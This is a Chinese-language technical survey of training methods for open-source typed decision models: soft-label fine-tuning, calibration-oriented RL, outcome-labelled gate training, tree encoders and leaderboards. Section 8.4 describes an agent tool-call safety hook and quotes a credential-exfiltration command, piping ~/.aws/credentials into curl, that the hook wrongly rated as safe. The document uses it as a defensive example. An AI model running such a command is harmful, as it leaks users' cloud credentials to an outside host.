# 开源 Jev 决策模型训练方法全景报告：软标签 SFT、RLCD、领域续训与共享前缀训练

> 配套阅读：《[Jev 决策小技术调研报告](../jev-decision/report.html)》（讲清"是什么"：定义、接口、精度与校准现状）与《[基于 Qwen3.5-4B 的 Jev 训练方案设计](../jev-qwen35-4b/report.html)》（2026-09-28 的**前瞻性**工程方案）。本文不同——本文是对**已经开源、已经发布权重、可复现训练流程的 Jev-like 决策模型实际训练方法**的横评，并补全 2026-10 月的最新进展。

> **诚实性声明**：官方 TypeSafe Jev 闭源，结构、数据与完整 RLCD 配方均未公开。本文统计的全部训练细节均来自**可核实的一手开源资料**（GitHub 仓库协议文件、Hugging Face 模型卡/数据集卡、本地 `jev-trainer` 训练代码与实测记录、arXiv API 核实的论文）。知乎文章仅作社区观察与背景，凡引用其说法均注明并独立核实关键事实；未能核实的说法不写成事实。

📅 **2026-10-20** ｜ **时间锚点**：上游仓库 `malevrigns/agent-jev` 主分支截至 2026-10-19 的提交；Typed Decisions 榜单数据为该数据集卡截至 2026-10-19 的版本 ｜ **分类**：models

---

## 目录

1. [背景：为什么决策模型需要一套独立的训练方法论](#1-背景为什么决策模型需要一套独立的训练方法论)
2. [统一形式化：所有开源 Jev 模型共享的输入/输出契约](#2-统一形式化所有开源-jev-模型共享的输入输出契约)
3. [开源版图：哪些模型开源了、走什么底座、怎么训练的](#3-开源版图哪些模型开源了走什么底座怎么训练的)
4. [范式一：软标签监督微调（AgentJev-0.6B 路线）](#4-范式一软标签监督微调agentjev-06b-路线)
5. [范式二：RLCD —— 面向校准的强化学习（Laya 路线）](#5-范式二rlcd--面向校准的强化学习laya-路线)
6. [范式三：真实结果标签的领域续训（coding-gates 路线）](#6-范式三真实结果标签的领域续训coding-gates-路线)
7. [其他训练路线：通用零样本、LoRA 专家、零权重先验与小型编码器](#7-其他训练路线通用零样本lora-专家零权重先验与小型编码器)
8. [最新进展（2026 年 10 月）：共享前缀树编码器、生态爆发与纪律标杆](#8-最新进展2026-年-10-月共享前缀树编码器生态爆发与纪律标杆)
9. [三种核心范式对比与选型建议](#9-三种核心范式对比与选型建议)
10. [风险、常见误解与注意事项](#10-风险常见误解与注意事项)
11. [参考资料](#11-参考资料)

---

## 1. 背景：为什么决策模型需要一套独立的训练方法论

### 1.1 问题回顾：不要让"写作模型"当开关

Agent 循环里绝大多数步骤不是写作问题：测试是否通过、下一个调用哪个工具、这条命令能不能放行、工单路由到哪个部门。用 27B–70B 的自回归大模型"说"出一个布尔值再解析文本，有三个结构性代价：

| | 把生成模型当开关 | 决策模型（System One） |
|---|---|---|
| 输出 | 需要解析/修复的文本或 JSON | 预设候选上的概率分布，类型安全 |
| 解码 | 逐 token 自回归 | 零输出 token，单前向 |
| 失败模式 | 格式非法、自信地说错 | 可设阈值的概率，不确定可转人工 |
| 典型延迟 | 数百 ms～数秒 | 20–50 ms（消费级显卡） |

直觉类比：**生成模型是"写结案陈词的律师"，决策模型是"看到按钮就按的反射弧"**——《思考，快与慢》里的 System 1。TypeSafe AI（创始人 Diogo Almeida，前 OpenAI 研究员）2026 年 9 月发布闭源商业模型 Jev 并将该类别命名为 System One Model，计费约 $0.042 / 百万输入 token、输出免费（数据源：Typed Decisions 数据集卡榜单）。

### 1.2 为什么"训练"值得单独讲

已有的两篇知识库报告解决的是"是什么"和"我想训一个该怎么设计"；而 2026-09 至 10 月，开源社区**实际跑出了多种不同训练范式**，它们回答的是另一组问题：

1. 标签从哪来——**合成教师概率分布**还是**真实执行结果**？
2. 损失用什么——软交叉熵、Brier，还是以 proper scoring rule 为奖励的强化学习？
3. 校准怎么来——训后温度拟合，还是训练中通过奖励塑造？
4. 架构怎么配——双向编码器（ModernBERT 类）还是去 LM 头的因果骨干（Qwen3 类）？
5. 如何防止"刷榜式过拟合"——切分纪律、措辞增强、OOD 隔离。

本文逐一拆开实际发布的 checkpoint 是怎么训出来的。

---

## 2. 统一形式化：所有开源 Jev 模型共享的输入/输出契约

### 2.1 输入输出协议

一次决策的输入是三元组：

```
x = (s, a, C)
s : state，任意非结构化状态（diff、trace、日志、JSON、工单文本）
a : question，类型化问题 + 判定标准
C : {c_1, ..., c_K}，候选描述集合（2 ≤ K ≤ 255，描述互不相同）
```

三种原语（Typed Decisions 沿用 TypeSafe 的字段名，括号内为开源实现里的规范化名）：

| 原语 | 问什么 | 输出 |
|---|---|---|
| `noul`（boolean） | 命题是否成立 | true/false 两端的概率、P(true)、value |
| `choice` | 给定候选集合选哪个 | 每选项概率、value、top_probability、margin（与次优之差） |
| `score` | 在有序量表上的等级（2–10 级） | 每级概率、level（argmax）、score = Σ i·P_i（期望等级） |

关键约定（来自 `jev_service/contract.py`，开源服务端实现）：

1. **传输 ID 不进模型输入**：问题 id 仅用于回填匹配，语义只能存在于问题和候选文本中；
2. **不做静默截断**：超过 2048 token 直接拒绝（`Shorten the input; nothing was truncated`）；
3. **状态对所有问题只编码一次（最新版服务端）**，候选之间互不可见。

### 2.2 通用判别架构：因果骨干 + 置换等变候选头

以 AgentJev-0.6B 为代表的因果路线，每个候选构成独立因果路径：

```
[STATE] s
        └─ [QUESTION] a
               ├─ [CANDIDATE] c_1  ── 取候选末尾 token 隐状态 h_1
               ├─ [CANDIDATE] c_2  ── h_2
               └─ [CANDIDATE] c_K  ── h_K

h_k : 骨干最后一层隐状态（去掉 LM head，不映射到词表）
```

候选头（来自本地 `jev-trainer/agentjev/model.py`，与上游同构）：

```
候选向量 [K, 1024]
  → Linear 1024→256
  → 2 层 Transformer（hidden 256, 4 头, GELU, pre-norm），无位置编码
  → Linear 256→1024，与骨干向量残差相加
  → RMSNorm → Linear 1024→256 → SiLU → Linear 256→1
  → 每候选一个标量 logit；softmax 在"每个问题"内归一化
```

两个设计不是口号而是实现出来的性质：

- **置换等变（permutation equivariance）**：候选集 Transformer 不放位置编码，打乱候选顺序只会同样打乱输出顺序，选项位置不夹带排名信息；训练代码里还有排列正则（重排候选再算一遍，对齐后约束两路 logit，bf16 下该 KL≈0）。
- **零解码**：隐状态直接到标量 logit，没有词表投影，没有 JSON 修复环节。

双向编码器路线（Laya，ModernBERT-large）则把整段文本一次双向编码、在选项标记位置取向量，候选头共享固定的 256-token 标签预算（因此官方建议 choice 不超过约 20 个选项）。

### 2.3 回答一个本地代码库的老问题：按任务类型分了头吗？

之前排查 `jev-trainer` 时问过"训练和推理是否区分 choice、noul、score，是否按类别选不同分类头"。读完训练代码后答案明确：**没有按类型分分类头**。三条事实：

1. 三种原语共用同一套候选向量管线与同一个标量打分头——它们都被归约成"K 个候选上的 softmax 分布"这一个问题；
2. 类型差异只体现在**数据侧**（noul 固定 2 候选、choice 2–255、score 2–10 有序）和**评测侧**（score 额外算期望等级 MAE）；
3. 唯一"按类型"的可学习处理是**校准温度**——每种原语在独立校准集上各拟合一个正标量温度，推理时除以各自温度。

> 🖼️ **配图 1（见 HTML 版）**：开源 Jev 生态谱系与三大训练流派 —— `diagrams/1-ecosystem-map.html`

### 2.4 数据集：一切训练的共同地基

开源训练几乎全部围绕 Hugging Face 上的 **`LocalLLaMA/typed-decisions`**（Apache-2.0）展开。

- **规模**：1200 个训练案例 + 400 个测试案例；每案例 1 段状态 + 5 道类型化决策题（全测试集 2000 个决策）。
- **四个工作流**，每个 300 训练案例：发票处理、客服、安全事件、Agent-trace 可观测性。
- **标签是教师模型给出的软概率分布**（不是单点标签，也不是实测动作成功率），含合成场景；数据集卡给出的**教师自一致率（teacher self-agreement）上限是 0.735**——在 train 上专门拟合的模型若显著超过 0.735，意味着在学教师的系统性偏好/怪癖，而不是在学"真实对错"。
- 字段沿用 TypeSafe 的 `noul/choice/score` schema，但数据集独立于 TypeSafe，**不复刻 Jev 本身**。

这个数据集的性质决定了后续所有训练方法的边界（见第 10 节）。

---

## 3. 开源版图：哪些模型开源了、走什么底座、怎么训练的

### 3.1 三个训练范式的代表

| 模型（权重开源） | 底座 / 参数量 | 训练方法 | Typed Decisions 测试集准确率 |
|---|---|---|---:|
| **AgentJev-0.6B v1**（`aimeigaoshou/agent-jev`，代码 `malevrigns/agent-jev`，Apache-2.0） | Qwen3-0.6B 因果骨干（去 LM 头），598M | 软标签 SFT（soft CE + 0.1 Brier），从 phase4 checkpoint 续训 600 步 | **79.25%**（仓库复测；BF16 发布权重经服务引擎为 79.50%） |
| 同模型从零底座复现（本地 `jev-trainer`，phase4 起始权重未公开） | 同上，598M | 完全相同协议，从 Qwen3 预训练底座直接微调 | **78.05%**（GB10 实测约 49 分钟，峰值显存约 34GB） |
| **Laya typed-decisions**（`convaiinnovations/laya-typed-decisions`，Apache-2.0） | ModernBERT-large，421M | **RLCD**（proper scoring rule 奖励 + REINFORCE）并联 soft CE，在 1200 训练案例上微调 | 76.6%（模型卡）/ 77.00%（仓库同题复测） |
| **AgentJev coding-gates**（HF `coding-gates` 分支，commit `359aa94b`） | 同 v1，598M | v1 之上用**真实测试运行结果**续训 + 中英问法增强 | TD 80.85%；代码门禁测试集 100% |
| TypeSafe Jev 1.13.0（闭源，参照系） | 未公开 | 官方宣称 RLCD（完整配方未公开） | 72.7% 零样本，P50 710ms |

### 3.2 底座的两条技术路线

1. **因果解码器路线**（Qwen3-0.6B 为代表）：保留前缀复用的可能（state+question 前缀天然共享）、上下文 2048，且可直接继承因果 LLM 的全部预训练知识；代价是候选越长重复计算越多（第 8 节的树编码器专门解决它）。
2. **双向编码器路线**（ModernBERT/mmBERT 为代表）：整段一次双向编码，33–42ms 极快、便宜，多语言容易扩展；但每个候选要重新做一次完整前向，上下文较短（512/1024）。

知乎技术社区把开源复刻归纳为三派——双向编码器派（Laya）、因果大模型底座派（基于 Qwen3.5 等微调的 4B 级模型）、轻量包装/边缘派。该划分与本文掌握的一手资料大体一致；知乎文章中提到的具体星标数（如"Laya 8820★"）**为其写作时点数据，本文未采信为当前事实**。

---
## 4. 范式一：软标签监督微调（AgentJev-0.6B 路线）

这是目前文档最完整、可在消费级设备上完整复现的训练路线。一手协议文件：上游 `typed_decisions/protocol.json`、`agentjev/` 训练代码；本地 `jev-trainer`（即本团队工作区中的 `/home/chenxiang.101/agents/jev/jev-trainer`）保留了从零底座开始的可复现版本。

### 4.1 数据切分：案例级、哈希确定、跨分割零重叠

```
1200 个官方训练案例（4 工作流 × 300）
  按 sha256(seed + case_id) 固定排序，每个工作流内：
  960 → train（每流 240）
  120 → dev   （每流 30）
  120 → calibration（每流 30）
400 个官方测试案例保持原样 → test（2000 决策，全程最后才读）
```

纪律要点（`prepare_data.py` 用断言强制）：

1. **先在案例层面切，再展开问题**：同一案例的 5 道题必在同一分割，防止内容泄漏；
2. **跨分割的案例 id 与 state 内容哈希都不许相撞**；
3. factors、gold、案例 id 不进模型输入；
4. 切分由固定种子 `20260921` 的哈希决定，不依赖文件行序，任何人可复现；
5. 数据集版本钉死在 revision `ea9306458d6e…`。

### 4.2 损失：软交叉熵 + Brier，和为什么是软标签

```
对问题 q 的 K 个候选：
  logp    = log_softmax(z)                     # z：候选头输出标量 logit
  p       = softmax(z)
  y       = 教师给出的目标概率分布（归一化，非 one-hot）

  L_CE    = - Σ_k y_k · logp_k                          # 软交叉熵
  L_Brier =   Σ_k (p_k - y_k)^2                        # 按候选求和的 Brier
  L       = L_CE + 0.1 · L_Brier
```

设计含义：

- **软标签携带教师的不确定性**：教师对两个选项给 0.6/0.4 与给 0.99/0.01 是不同的监督信号；one-hot 会把前者压成硬标签，丢掉"这题本来就两可"的信息。
- **Brier 项是显式的分布形状约束**：CE 只对教师质量所在位置敏感，Brier 同时惩罚"非答案选项上的多余概率"，把整条分布往教师分布压；权重 0.1 是协议钉死的超参。
- 与第 5 节 RLCD 的对比很有意思：**这里校准是"拟合"出来的（拟合一条好分布 + 训后温度），RL 路线的校准是"奖励"出来的。**

### 4.3 优化配置（全参微调，不是 LoRA）

| 超参 | 值 | 说明 |
|---|---|---|
| 训练步数 | 600 | 每 100 步在 dev 上评一次（含第 0 步基线） |
| 有效批大小 | 4 题 × 4 梯度累积 | 每题含其全部候选路径 |
| 骨干学习率 | 1e-5 | LLRD（layer-wise LR discrimination）：预训练骨干小步走 |
| 候选头学习率 | 1e-4 | 新加随机初始化的头 10 倍大步走 |
| 优化器 | AdamW，weight_decay 0.01 | |
| 学习率计划 | 20 步 warmup + 余弦衰减 | |
| 梯度裁剪 | 全局范数 1.0；出现非有限 loss/梯度直接报错中止 | |
| 精度 | bf16 autocast（logits 升回 float32 再 softmax） | |
| 上下文 | 2048 token，超长拒绝不截断 | |

### 4.4 选 checkpoint 与校准：顺序锁死，防 test 泄漏

```
训练中：每 100 步 → dev 软交叉熵 → 保留 dev soft CE 最低的权重
选定之后：才第一次读 calibration 分割
           → 对每种原语（boolean/choice/score）各拟合一个正标量温度
             搜索区间 t ∈ [0.25, 4]（对数均匀 81 档），最小化校准集 soft CE
最后：才读 test，用选定权重 + 三组温度一次性评测
run 目录已有 selection.json 则直接报错，防止重跑覆盖
```

评测指标体系（`train.py` 的实测口径）：top-1 准确率（与教师 argmax 一致率）、软交叉熵、按候选求和 Brier、ECE（10 桶）、score 期望等级 MAE，并按原语类型和工作流分别出表。

### 4.5 结果与"从零复现"的价值

- **官方 v1（phase4 续训）**：79.25%（1585/2000），soft CE 0.8494，Brier 0.0448，ECE 0.1687，score MAE 0.2096；选中第 600 步。
- **本地 jev-trainer 从 Qwen3 底座直训（无 phase4 起始权重）**：78.05%，约 49 分钟（GB10 / DGX Spark，128GB 统一内存），峰值显存约 34GB。
- 分工作流（v1）：发票 86.20%、客服 82.20%、安全事件 76.80%、trace 可观测性 71.80%；分原语：boolean 88.83%、choice 75.33%、score 75.00%。
- 相对其 phase4 起始点（38.70%）提升 40.55 个点（按案例 bootstrap 95% 区间 [+37.35, +43.50]）；相对 Laya 已发布 checkpoint +2.25 点（[+0.65, +3.90]）。注意两者**训练预算不对等**：Laya 用满全部 1200 训练案例，AgentJev 留出了 240 个 dev/校准案例。

> 诚实性注记：79.25% 的含义是"与公开教师 argmax 的一致率"，**不是真实 coding agent 任务成功率**；协议与报告均反复声明这一点。

---

## 5. 范式二：RLCD —— 面向校准的强化学习（Laya 路线）

### 5.1 RLCD 要解决的问题：argmax 对了，概率却不可信

只做硬标签 SFT 的模型可以选得很准，但说"70%"时长期来看未必真有 70% 的事件发生——概率不校准，阈值级联（自动/复核/转人工）就失去依据。RLCD（Reinforcement Learning for Calibrated Decisions）的思路是：**把"输出诚实概率"本身做成强化学习的最优策略**。

### 5.2 算法：Gaussian 探索 + proper scoring rule 奖励 + REINFORCE

根据 Laya typed-decisions 模型卡的训练说明（一手）与社区技术拆解交叉整理，流程为：

```
1. 前向：策略对 K 个候选输出 logits z，softmax 得基准分布
2. 探索：对一组（group）候选的 logits 加零均值 Gaussian 噪声 ε，
        组内减均值中心化 → z̃ = z + ε；再 softmax 得"采样策略" π̃
3. 奖励：π̃ 与目标（教师或真实标签）分布之间用严格适当评分规则计分：
        R_log = Σ_k y_k · log π̃_k                     （对数评分）
        R_sph = (Σ_k y_k · π̃_k) / ‖π̃‖                （球面评分）
        RPS   = 1/(K-1) · Σ_{j=1..K-1} (F_j - F*_j)²   （有序题：排序概率评分，
                    F 为累积分布，score 原语专用）
        R = R_log + R_sph (+ RPS for score)
4. 优势：同组多个噪声样本的 reward 减组均值 → group-mean baseline 降方差
5. 更新：REINFORCE 策略梯度 ∇J ≈ A · ∇ log π̃
6. 并联：同时保留对教师分布的 soft cross-entropy 项
```

数学核心是**严格适当评分规则（strictly proper scoring rule）**的经典性质：当且仅当预测分布等于真实分布时，期望评分最大。于是 RL 没有别的捷径可走，只能报告诚实概率——校准不是事后修补，而是被奖励函数内生化了。

### 5.3 底座与复现门槛

- 底座 **ModernBERT-large（421M，双向编码器）**，上下文 1024；同家族还有通用英文 `laya`（512 上下文）与多语言 `laya-multilingual`（mmBERT-base 322M，1024，宣称 100+ 语种）。
- 数据：Typed Decisions 全部 1200 训练案例 / 6000 决策。
- 官方提供 Kaggle notebook（`laya_finetune_typed_decisions_2xT4_kaggle.ipynb`），**免费 2×T4 约 4–5 小时可复现**——这是三大范式里硬件门槛最低的完整 RL 训练。
- 学术前史（编号已经 arXiv 官方 API 核实）：作者 Nandakishor M 此前的《SalesRLAgent: A Reinforcement Learning Approach for Real-Time Sales Conversion Prediction and Optimization》（**arXiv:2503.23303，2025-03-30**）与《Confidence-Aware Routing for Large Language Model Reliability Enhancement》（**arXiv:2510.01237，arXiv 页面发布日期 2025-09-23**；知乎文章称其"10 月发表"，以 arXiv 日期为准）。

### 5.4 实测结果与自家承认的缺陷

| 指标 | Laya typed-decisions | TypeSafe Jev 1.13.0 | 教师自一致上限 |
|---|---:|---:|---:|
| top-1 准确率 | 0.766 | 0.727 | 0.735 |
| soft accuracy（整条分布贴合度） | 0.471 | 0.580 | — |
| Brier | 0.062 | 0.148 | — |
| ECE | **0.213（仍过自信）** | 0.144 | — |
| score MAE | 0.242 | 0.391 | — |

模型卡非常坦白地列出了训练事故与局限（一手）：

1. **过自信仍未解决**：ECE 0.213 高于闭源 Jev；
2. **温度拟合泄漏事故**：这版 checkpoint 的按类型温度是在**刚训练过的同一批数据**上拟合的（三个温度 1.0148/1.0374/1.0575 都贴着 1.0，本身就是信号），issue #186 记录后 notebook 才改为留出切片——**已发布权重在重新拟合前应视为未校准**；
3. 零样本直接用通用 `laya` 只有 0.362，它是"好原料"而非"即插即用开关"；
4. choice 选项建议 ≤20；多语言版个别冷门语言（如高棉语）准确率为 0 却以 95% 置信输出——**错得很自信**。

社区对 RLCD 也有值得记录的批评（知乎作者"一脑袋浆糊"的观点，属观点而非事实）：常规校准用一个确定性后处理（温度/等渗回归）就能做，RL 需要的探索—奖励结构在纯校准问题里位置尴尬；RLCD 真正的增量可能在于把**适当评分**与端到端表示学习联合优化，而非"RL 校准"这个标签本身。

---

## 6. 范式三：真实结果标签的领域续训（coding-gates 路线）

### 6.1 动机：教师标签不会看测试输出

v1 的 README 自己提出了尖锐问题：Typed Decisions 从不给模型看测试运行器打印什么，但它的招牌例子恰恰是"测试通过了吗？"。实测 v1 在真实测试输出上：**348 个失败案例里 123 个被它叫成"通过"**，其中 115 个还是 `23 tests passed, 1 failed.` 这类一行摘要（v1 给该状态的 P(通过) 高达 0.84）。教师分布标签 ≠ 执行结果真值，这是纯数据集内训练补不上的洞。

### 6.2 数据工程：标签来自"怎么构建的"，不是"读输出"

`coding_gates/` 的数据构造法值得当成模板：

| 要素 | 做法 |
|---|---|
| 真实运行 | 2100 次真实测试运行：pytest、unittest、jest、mocha 各 450；vitest、node --test 各 150 |
| 结果类别 | pass（可含 skipped）/ fail（1–6 断言失败）/ error（被测代码抛异常）/ broken（语法或导入错误，跑不起来）/ no tests |
| 标签来源 | 项目构建时**种植**结果，且用运行器退出码逐一核对（2100/2100 匹配），从不靠回读输出文本打标 |
| 一行摘要 | 1800 条 CI/Agent 常见格式（含中文"测试结果：共 24 个，通过 23 个，失败 1 个"） |
| 问题 | 门禁（boolean）、下一步动作（5 选 1 choice）、失败计数（4 级 score，仅测试真的跑了才问） |
| 切分 | 每运行器×每结果内 70/15/15；**vitest 与 node --test 整组留作 OOD**，不训练、不参选 |
| 工程细节 | Python/JS 孪生小模块（各 15 函数）；本机路径统一替换为 `C:/dev/...` 并有测试断言无机器路径泄漏 |

### 6.3 问法增强与第一次失败实验

第一次训练只固定一种问法，模型在 dev 上把这种问法背得完美，却把"23 tests passed, 1 failed."叫成通过（P=1.00）——**学到了措辞而不是任务**。该尝试在读任何留出集之前就被 dev 否决丢弃。

正式候选改用 `wordings.py` 做问法增强：英文/中文、带/不带 criteria、**倒置问法**（"这次运行是否显示有问题？"）；dev 评测用 4 种问法，另外 5 种问法（含一个倒置句）冻结到最后才考。

### 6.4 受约束的 checkpoint 选择（防止"新能力毁旧能力"）

```
一个步数 checkpoint 可被选中，当且仅当：
  它在 Typed Decisions dev 上的 soft CE ≤ 第 0 步 + 0.01   （不许牺牲原能力）
  且在门禁 dev（4 种问法）上 soft CE 最低
温度仍只在 Typed Decisions calibration 上拟合；所有留出集最后只读一次
```

### 6.5 结果

| 评测 | v1 | coding-gates 候选 |
|---|---:|---:|
| 门禁测试集准确率（280 运行 + 271 摘要） | 77.7% | **100.0%** |
| 失败被叫绿（测试集） | 123/348 | **0/348** |
| 未见运行器（vitest/node --test）门禁准确率 | 89.3% | **95.0%** |
| 未见运行器：失败放行 | 31/198 | 7/198 |
| 5 种未见问法平均准确率 | 78.4% | **95.6%** |
| Typed Decisions top-1 | 79.50%（BF16 服务口径） | **80.85%**（+1.35，95% CI [+0.20, +2.50]） |

代价与边界：极简问法"Tests passing? + yes/no"只有 83.1%；node 的 dot reporter（只打印点、无退出码）是主要失分点；项目小、单录音环境（Win11 + 固定工具版本），真实仓库日志更吵。权重只与 v1 相差 `model.safetensors` 与 `temperatures.json` 两个文件。

---
## 7. 其他训练路线：通用零样本、LoRA 专家、零权重先验与小型编码器

Typed Decisions 数据集卡维护着两张必须分开看的榜（截至 2026-10-19）：

### 7.1 通用零样本开放权重大模型（从未见过该数据集）

代表性结果：Amos 1 medium（9B，0.7645）、Amos 1 large（27B，0.761）、Perplexity `pplx-decider-v1.1-27b`（0.753）、vllm-sr 的 d3 家族（27B 0.749 / 4B 0.743 / 2B 0.629 / 0.6B 0.425）、Cloudflare clef 系列（27B 0.728 / 9B-flash 0.710）、`openjev/openjev`（27B，0.728）。闭源榜首是 meraGPT Decider 1（0.768，KL 0.096）。

观察：**名字叫 Jev 不等于强**——多个以 JEV/GEV 命名的模型排在 0.49–0.69，而 d3、clef、Amos 这类通用决策模型零样本就能压过闭源 Jev 的 0.727。榜单还记录了请求形态效应：Jev 每题单独请求时 yes/no 准确率 0.843，五个问题合并请求只有 0.788。

### 7.2 在 train 上拟合/微调的专家模型（与零样本不可比）

| 训练形态 | 代表（截至 2026-10-19 榜单） | 准确率 |
|---|---|---:|
| 4B 级 + LoRA + 温度校准 | Decider-4B（Qwen3.5-4B + LoRA，117ms/A800） | **0.8205（拟合榜第一）** |
| 4B 级 + LoRA | Arbiter-4B（从 NeoHorse-Jev-4B 再 LoRA） | 0.817 |
| 27B 全参微调 | Darwin-27B-ZTC-v5 | 0.812 |
| 3B 全参微调 | ministral3-3b-reasoning（GB10，373ms） | 0.808 |
| **零权重改动：逐题先验拟合** | Amos 1 large：只为每个问题×选项拟合一个 log-prior 偏置项，不改权重 | 0.8025 |
| MoE + LoRA | OpenDecider-large-td（Qwen3-Next-80B-A3B） | 0.801 |
| 400M 编码器微调 | OpenDecider-nano（17ms） | 0.796 |
| 144–150M 小型编码器 | Phocinae-Largha-150M（mmBERT-small，21ms/RTX5090）、SafeDecide-140M | 0.791 / 0.754 |
| 270M 全参 | gemma3-270m-typed-decisions | 0.761（specialist） |

三条工程启示：

1. **LoRA 在 4B 级因果模型上就能拿到拟合榜最优**，全参不是必需；
2. **最便宜的适配甚至不需要训练权重**：Amos large 只加逐题 log-prior 偏置就从 0.761 到 0.8025——当评测/业务问题集合稳定时，先验修正是高性价比基线；
3. 编码器派在 140–421M 量级已能逼近 0.79，把延迟压到 17–40ms。

> 🖼️ **配图 2（见 HTML 版）**：统一判别架构与候选头数据流 —— `diagrams/2-architecture.html`

---

## 8. 最新进展（2026 年 10 月）：共享前缀树编码器、生态爆发与纪律标杆

### 8.1 TreeEncoder：把"每候选重算一遍"改为整树一次前向（训练+推理双侧）

v1 每个候选是独立因果路径，state+question 前缀被重复编码。10 月上游合入的 **TreeEncoder** 把同一问题的 token 组织成前缀树：

- 共享节点只编码一次；每个 token 只注意自己和祖先（ancestor-only attention），位置用**路径深度**而非全局位置，保证候选之间互不偷看；
- 反向传播穿过共享节点；CPU 端 collate 预计算树拓扑；执行后端自动选择：宽树走分段因果 SDPA、碎片树走有界稠密 mask、小批直接独立路径，短负载自动回退 Path；
- 旧的 path batch 与 checkpoint 完全兼容，默认编码器仍是 path，`encoder_impl="tree"` 显式开启。

实测（上游 `outputs/tree_benchmark_report.md`，RTX 5060 Laptop，合成负载 + 随机小模型；作者声明不可直接外推真实模型）：

| 场景 | 推理加速 | **训练**前向+反向加速 | 训练显存峰值增量 |
|---|---:|---:|---:|
| 长前缀 / 64 候选 | 47.98→14.76ms（3.25×） | 143.57→38.91ms（**3.69×**） | 2217.7→390.9 MiB |
| 问题大小不均衡 | 1.63× | 1.85× | 807.2→99.1 MiB |
| 短前缀 / 少候选 | 约 1×（自动回退 Path） | 约 1× | 不变 |

服务侧同题实测（真实 v1 权重，400 案例）：P50 案例延迟 278.01→**43.89ms（6.3×）**，吞吐 3.68→27.39 cases/s（7.4×），每案例骨干 token 4074→**443**；2000 个选择中 1998 个完全一致，2 个变化均在 0.0031 的平局内，最大概率差 0.0053；常驻权重 2283→1443 MiB（骨干线性层以 BF16 存储，输出逐位一致）。本地 `model.py` 中预留的 `TreeEncoder` 占位正是这个演进的工程接口。

### 8.2 评测生态在两周内成形

- 数据集卡给出**一键 HF Jobs 跑分**命令（`score_with_jobs.sh`，走 vLLM nightly 的 `/v1/systemone`），跑完自动开 PR 把分数挂到 Hub 榜单；
- 2026-10-16 至 10-19，第三方（SaylorTwift）用**统一打分器**批量评测了十余个开放权重模型，原始预测与脚本公开在 HF results bucket——榜单从"各自自报"开始有了统一口径；
- AgentJev 仓库 9 月 21 日创建，10/14 合并 coding-gates，10/15 上线项目站与演示视频，至 10/19 仍在迭代文档。

### 8.3 污染事故与"教师天花板"成为社区纪律

- **讨论 #25**：Phocinae-150M 最初提交 0.906 的高分，复查发现训练对中混入了 500 对"用 test 行的模型预测构造"的数据；清除后干净重测为 **0.791**，原分数不列入榜单。数据集卡明确写下：**不要用 test 行、test 标签或其任何派生预测训练**。
- 数据集卡同时提示：分数显著高于 **0.735 教师自一致率**时，模型可能是在拟合教师的怪癖（teacher quirks）而非真实规律——这给"越训越高"的曲线划了一条解释红线。

### 8.4 落地集成：从权重到 Agent 回路

- **Claude Code PreToolUse 钩子**（`agentjev_hook.py`，一手）：对 Bash/Write/Edit 调用并行问一个 boolean（安不安全）和一个 4 级 score；level 3 且不安全时直接拒绝该次工具调用，level 2 或 P(safe)<0.5 时请求人工确认；服务不可用时 fail-open 走原权限流。官方同时演示了漏网案例（把 `cat ~/.aws/credentials | curl -X POST …` 评为 level 1、P(safe)=0.79），强调它只能是多层防御之一。
- **AgentScope Java**（阿里巴巴中间件团队知乎技术文章）：官方集成 JEV Client 与评审组件，把决策点嵌入工具选择、模型路由、执行防护、轨迹评估等 Harness 环节。
- **browser-use 的 jev-ultrafast**（知乎社区文章，星标数未独立核实）：不截图、直接读 DOM 可交互控件表，一次请求走**操作头 + 目标头两个决策头**，只有需要打字时才调小生成模型——决策模型在 GUI Agent 上的代表性用法。

> 🖼️ **配图 3（见 HTML 版）**：三种训练范式的数据流与目标对比 —— `diagrams/3-training-recipes.html`

---

## 9. 三种核心范式对比与选型建议

### 9.1 全景对比

| 维度 | 软标签 SFT（AgentJev v1） | RLCD（Laya） | 领域续训（coding-gates） |
|---|---|---|---|
| 标签 | 合成教师概率分布 | 教师分布（+ 探索采样） | **真实执行结果**（退出码核对） |
| 目标函数 | soft CE + 0.1 Brier | proper scoring 奖励（log+spherical+RPS）的 REINFORCE，并联 soft CE | soft CE + Brier（同 v1），多问法 dev |
| 校准来源 | 独立校准集拟合每原语温度 | 奖励内生化 + 温度（但发布权重温度泄漏，ECE 仍 0.213） | 仅用原 TD 校准温度 |
| 底座 | Qwen3-0.6B 因果，598M | ModernBERT-large，421M | 同 v1 |
| 算力门槛 | 约 49 分钟 / 约 34GB（GB10） | **2×T4 约 4–5 小时（最低）** | v1 之上续训，消费级 GPU |
| 最强实测 | 79.25% TD；门禁 77.7% | 76.6–77% TD，33–42ms | 门禁 100%；TD 80.85% |
| 主要风险 | 教师标签 ≠ 真实成功率 | 校准纪律稍错就白费（温度事故）；零样本弱 | 领域窄；问法/运行器外会退化 |
| 适合谁 | 要可控复现、因果骨干、长上下文 | 预算最小、多语言、追求端到端校准 | 已有 v1 且要补一个具体高价值门禁 |

### 9.2 工程选型 Checklist

- ☐ 先问自己要的是"argmax 对"还是"概率可信"——后者必须预留独立 calibration 分割，且温度**绝不**在训练数据上拟合；
- ☐ 切分在案例/会话级做，内容哈希去重，test 只在选型后读一次；
- ☐ 标签是教师软分布时，loss 至少包含分布形状项（Brier 或适当评分），别退回 one-hot CE；
- ☐ 用 RL（RLCD）前确认真的需要探索—奖励结构：若只是要校准，先试温度/等渗回归基线；
- ☐ 关键业务门禁优先造**结果真值数据**（像 coding-gates 那样用退出码/种植结果），并整组留出运行器/渠道做 OOD；
- ☐ 问法增强（中英、倒置、删 criteria）+ 多问法 dev，是防止"背措辞"的最便宜手段；
- ☐ 续训时加"原能力不退化"约束（如 dev soft CE ≤ 基线 + 0.01）；
- ☐ 候选数量大时选因果骨干 + 共享前缀树编码；追求极致延迟选 140–421M 双向编码器；
- ☐ 决策模型永远只做多层防御的一层：权限、沙箱、人工阈值不能省（官方 hook 的凭据泄漏误判就是例子）；
- ☐ 上线后用自己的结果数据持续做校准回归，ECE/Brier 进监控。

---

## 10. 风险、常见误解与注意事项

1. **0.79 不是"90% 真实任务成功"**：所有 Typed Decisions 分数都是与公开教师 argmax 的一致率，数据含大量合成场景；AgentJev 与 Laya 的文档都显式否认其等价于真实业务成功率。
2. **specialist 与 generalist 不可横比**：在 train 上拟合过的模型（最高 0.82）与零样本模型（最高 0.768）是两张榜；自报分数与第三方统一跑分口径也不同（ECE 定义、平局判定都有差异）。
3. **教师天花板 0.735 的含义**：拟合模型超过它未必是好事——可能在学教师的系统性偏差；判断模型价值要用独立的结果数据。
